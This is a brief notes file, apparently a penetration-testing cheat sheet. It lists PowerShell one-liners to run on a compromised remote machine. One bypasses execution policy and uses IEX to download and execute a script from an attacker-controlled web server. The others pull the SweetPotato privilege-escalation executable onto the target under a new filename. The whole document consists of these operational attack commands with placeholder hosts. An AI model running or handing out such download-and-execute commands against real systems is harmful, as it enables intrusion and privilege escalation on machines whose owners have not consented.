## Start up WebServer

#Run on remote machine to download scripts from server
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/helloworld.ps1'))

#Run on remote machine to download scripts from server
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/SweetPotato.exe', 'C:<LOCATION>\sp.exe')

#If already in PowerShell to grabfile
(New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/SweetPotato.exe', 'C:<LOCATION>\sp2.exe')